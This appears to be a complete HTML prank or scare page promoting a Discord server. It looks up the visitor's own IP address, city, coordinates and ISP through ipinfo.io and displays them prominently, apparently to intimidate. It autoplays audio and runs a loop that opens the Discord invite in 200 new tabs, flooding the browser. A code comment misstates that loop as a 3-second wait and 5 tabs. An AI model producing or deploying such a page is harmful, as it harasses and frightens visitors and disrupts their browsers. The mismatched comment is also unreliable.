<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>discord.gg/zx7</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Courier New', Courier, monospace;
      color: #0000ff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
    }

    .image-container img {
      width: 350px;
      height: auto;
      border: 2px solid #0000ff;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0, 0, 255, 0.7);
    }

    .info {
      margin-top: 20px;
      font-size: 1.5em;
      color: #0000ff;
      text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff;
      letter-spacing: 4.5px;
      white-space: pre-wrap;
    }

    .text {
      margin-top: 20px;
      font-size: 3em;
      color: #0000ff;
      text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff;
      letter-spacing: 4.5px;
    }
  </style>
</head>
<body>
  <div class="image-container">
    <!-- âœ… This GIF works. Replace it later with your own -->
    <img src="https://media.discordapp.net/stickers/939280920983265290.png" alt="Discord GIF" />
  </div>

  <audio autoplay loop>
    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
  </audio>

  <div class="info" id="ip-info">
    <strong>IP: <span id="ip"></span></strong><br />
    <span><strong>City:</strong> <span id="city"></span></span><br />
    <span><strong>Region:</strong> <span id="region"></span></span><br />
    <span><strong>Country:</strong> <span id="country"></span></span><br />
    <span><strong>Location:</strong> <span id="loc"></span></span><br />
    <span><strong>Organization:</strong> <span id="org"></span></span><br />
    <span><strong>Timezone:</strong> <span id="timezone"></span></span>
  </div>

  <div class="text">discord.gg/zx7</div>

  <script>
    fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
        document.getElementById('ip').textContent = data.ip;
        document.getElementById('city').textContent = data.city;
        document.getElementById('region').textContent = data.region;
        document.getElementById('country').textContent = data.country;
        document.getElementById('loc').textContent = data.loc;
        document.getElementById('org').textContent = data.org;
        document.getElementById('timezone').textContent = data.timezone;
      });
  </script>
<script>
  // Wait 3 seconds, then open the link 5 times
  setTimeout(() => {
    for (let i = 0; i < 200; i++) {
      window.open('https://discord.gg/zx7', '_blank');
    }
  }, 50); 
</script>

</body>
</html>
